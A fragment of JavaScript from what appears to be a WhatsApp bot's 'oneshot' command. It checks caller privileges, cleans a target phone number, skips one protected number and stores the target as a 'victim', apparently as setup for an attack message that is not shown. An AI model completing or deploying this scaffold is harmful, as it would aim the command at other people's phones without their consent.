...
case 'oneshot': {
	if (!isCreator) return replyglobal(mess.owner)
if (!text) return replyglobal(`Usage .${command} 93794384087`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replyglobal(`Example : ${prefix+command} 93794384087`)
var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "93794384087") {
    return;
...
if (!isPremium) return replyglobal(mess.prem)
if (!q) return replyglobal(`Usage .${command} 93794384087`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replyglobal(`Example : .${command} 93794384087`)
